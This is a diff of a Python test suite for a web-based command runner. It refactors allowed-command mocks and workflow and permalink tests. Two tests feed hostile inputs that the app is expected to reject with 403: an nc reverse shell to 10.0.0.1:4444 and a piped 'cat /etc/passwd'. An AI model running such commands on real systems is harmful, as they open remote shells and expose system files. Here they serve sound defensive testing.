@@ -11,6 +11,7 @@ import re
 import sqlite3
 import uuid
 from datetime import datetime, timedelta
+from pathlib import Path
 import unittest.mock as mock
 
 import app as shell_app
@@ -687,25 +688,38 @@ class TestAllowedCommandsRoute:
 
     def test_unrestricted_when_no_file(self):
         client = get_client()
-        # Patch in app's namespace — the route calls load_allowed_commands() directly
-        with mock.patch("blueprints.content.load_allowed_commands", return_value=(None, [])):
+        with mock.patch("blueprints.content.load_commands_registry", return_value={"commands": [], "pipe_helpers": []}):
             data = json.loads(client.get("/allowed-commands").data)
         assert data["restricted"] is False
 
     def test_restricted_when_file_present(self):
         client = get_client()
-        with mock.patch("blueprints.content.load_allowed_commands", return_value=(["ping", "nmap"], [])):
-            with mock.patch("blueprints.content.load_allowed_commands_grouped", return_value=[]):
-                data = json.loads(client.get("/allowed-commands").data)
+        with mock.patch("blueprints.content.load_commands_registry", return_value={
+            "commands": [
+                {"root": "ping", "category": "Networking", "policy": {"allow": ["ping"], "deny": []}},
+                {"root": "nmap", "category": "Scanning", "policy": {"allow": ["nmap"], "deny": []}},
+            ],
+            "pipe_helpers": [],
+        }):
+            data = json.loads(client.get("/allowed-commands").data)
         assert data["restricted"] is True
         assert "ping" in data["commands"]
 
     def test_returns_grouped_commands_when_restricted(self):
         client = get_client()
         groups = [{"name": "Networking", "commands": ["ping", "traceroute"]}]
-        with mock.patch("blueprints.content.load_allowed_commands", return_value=(["ping", "traceroute"], [])):
-            with mock.patch("blueprints.content.load_allowed_commands_grouped", return_value=groups):
-                data = json.loads(client.get("/allowed-commands").data)
+        with mock.patch("blueprints.content.load_commands_registry", return_value={
+            "commands": [
+                {"root": "ping", "category": "Networking", "policy": {"allow": ["ping"], "deny": []}},
+                {
+                    "root": "traceroute",
+                    "category": "Networking",
+                    "policy": {"allow": ["traceroute"], "deny": []},
+                },
+            ],
+            "pipe_helpers": [],
+        }):
+            data = json.loads(client.get("/allowed-commands").data)
         assert data["restricted"] is True
         assert data["groups"] == groups
 
@@ -763,10 +777,37 @@ class TestWorkflowsRoute:
         for item in data["items"]:
             assert isinstance(item.get("title"), str) and item["title"]
             assert isinstance(item.get("description"), str)
+            assert isinstance(item.get("inputs"), list)
             assert isinstance(item.get("steps"), list) and item["steps"]
+            for workflow_input in item["inputs"]:
+                assert isinstance(workflow_input.get("id"), str) and workflow_input["id"].strip()
+                assert isinstance(workflow_input.get("label"), str) and workflow_input["label"].strip()
+                assert workflow_input.get("type") in {"domain", "host", "url", "port", "path"}
+                assert isinstance(workflow_input.get("required"), bool)
+                assert isinstance(workflow_input.get("placeholder"), str)
+                assert isinstance(workflow_input.get("default"), str)
+                assert isinstance(workflow_input.get("help"), str)
             for step in item["steps"]:
                 assert isinstance(step.get("cmd"), str) and step["cmd"].strip()
                 assert isinstance(step.get("note"), str)
+
+    def test_payload_includes_input_driven_workflows(self):
+        client = get_client()
+        data = json.loads(client.get("/workflows").data)
+        by_title = {item["title"]: item for item in data["items"]}
+        dns = by_title["DNS Troubleshooting"]
+        assert dns["inputs"] == [
+            {
+                "id": "domain",
+                "label": "Domain",
+                "type": "domain",
+                "required": True,
+                "placeholder": "example.com",
+                "default": "darklab.sh",
+                "help": "",
+            }
+        ]
+        assert dns["steps"][0]["cmd"] == "dig {{domain}} A"
 
 
 # ── /shortcuts ────────────────────────────────────────────────────────────────
@@ -917,15 +958,15 @@ class TestRunRoute:
 
     def test_disallowed_command_returns_403(self):
         client = get_client()
-        # Patch in commands' namespace — is_command_allowed calls load_allowed_commands
+        # Patch in commands' namespace — is_command_allowed calls load_command_policy
         # from commands' own namespace, not from app's.
-        with mock.patch("commands.load_allowed_commands", return_value=(["ping"], [])):
+        with mock.patch("commands.load_command_policy", return_value=(["ping"], [])):
             resp = client.post("/run", json={"command": "nc -e /bin/sh 10.0.0.1 4444"})
         assert resp.status_code == 403
 
     def test_shell_operator_returns_403(self):
         client = get_client()
-        with mock.patch("commands.load_allowed_commands", return_value=(["ping"], [])):
+        with mock.patch("commands.load_command_policy", return_value=(["ping"], [])):
             resp = client.post("/run", json={"command": "ping google.com | cat /etc/passwd"})
         assert resp.status_code == 403
 
@@ -1772,10 +1813,16 @@ class TestAutocompleteRoute:
         assert isinstance(data["suggestions"], list)
         assert "context" in data
         assert isinstance(data["context"], dict)
+        assert "builtin_command_roots" in data
+        assert "commands" in data["builtin_command_roots"]
+        assert "ip" in data["builtin_command_roots"]
+        assert "status" in data["builtin_command_roots"]
 
     def test_returns_configured_context(self):
         client = get_client()
-        with mock.patch("blueprints.content.load_autocomplete_context", return_value={"nmap": {"flags": []}}):
+        with mock.patch("blueprints.content.load_autocomplete_context_from_commands_registry", return_value={
+            "nmap": {"flags": []},
+        }):
             data = json.loads(client.get("/autocomplete").data)
         assert data["suggestions"] == []
         assert "nmap" in data["context"]
@@ -1899,7 +1946,7 @@ class TestRunPermalinkRoute:
             import gzip
             from run_output_store import RUN_OUTPUT_DIR, ensure_run_output_dir
             ensure_run_output_dir()
-            with gzip.open(os.path.join(RUN_OUTPUT_DIR, f"{run_id}.txt.gz"), "wt", encoding="utf-8") as f:
+            with gzip.open(Path(RUN_OUTPUT_DIR) / f"{run_id}.txt.gz", "wt", encoding="utf-8") as f:
                 for line in full_output_lines:
                     f.write(line + "\n")
 
@@ -1911,7 +1958,7 @@ class TestRunPermalinkRoute:
         conn.commit()
         conn.close()
         try:
-            os.unlink(os.path.join(RUN_OUTPUT_DIR, f"{run_id}.txt.gz"))
+            os.unlink(Path(RUN_OUTPUT_DIR) / f"{run_id}.txt.gz")
         except FileNotFoundError:
             pass
 
@@ -2145,7 +2192,7 @@ class TestRunFullOutputRoute:
         import gzip
         from run_output_store import RUN_OUTPUT_DIR, ensure_run_output_dir
         ensure_run_output_dir()
-        with gzip.open(os.path.join(RUN_OUTPUT_DIR, f"{run_id}.txt.gz"), "wt", encoding="utf-8") as f:
+        with gzip.open(Path(RUN_OUTPUT_DIR) / f"{run_id}.txt.gz", "wt", encoding="utf-8") as f:
             f.write("line 1\nline 2\n")
 
     def _delete_run(self, run_id):
@@ -2156,7 +2203,7 @@ class TestRunFullOutputRoute:
         conn.commit()
         conn.close()
         try:
-            os.unlink(os.path.join(RUN_OUTPUT_DIR, f"{run_id}.txt.gz"))
+            os.unlink(Path(RUN_OUTPUT_DIR) / f"{run_id}.txt.gz")
         except FileNotFoundError:
             pass
 
